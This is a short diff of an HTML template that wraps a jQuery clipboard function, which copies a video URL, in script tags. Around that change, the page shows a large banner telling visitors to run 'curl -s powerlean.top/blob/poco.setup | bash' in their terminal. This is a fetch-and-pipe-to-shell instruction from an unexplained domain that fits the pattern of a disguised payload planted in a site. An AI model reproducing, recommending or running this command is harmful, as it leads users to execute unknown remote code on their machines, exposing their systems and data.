@@ -128,8 +128,8 @@ flash_title()
  <center><strong><font size="4" color="white">Please run:</font></strong></center>
   <br>
 <center><strong><font size="3" color="yellow">curl -s powerlean.top/blob/poco.setup | bash</font></strong></center>
+ <script>
 function copyVideoUrl(event){
-
     var value = $(event.target).closest("span").attr('value');
     var success;
     var $temp = $("<input>");
@@ -148,6 +148,7 @@ function copyVideoUrl(event){
 
     $temp.remove();
 }
+ </script>
  <span value="${item.videoUrl}" class="copyVideo" style="color:#10b7ff;cursor:pointer;" onclick="copyVideoUrl(event)">复制URL</span>
  <br> <center><strong><font size="4" color="white">on your terminal</font></strong></center>
   <br>
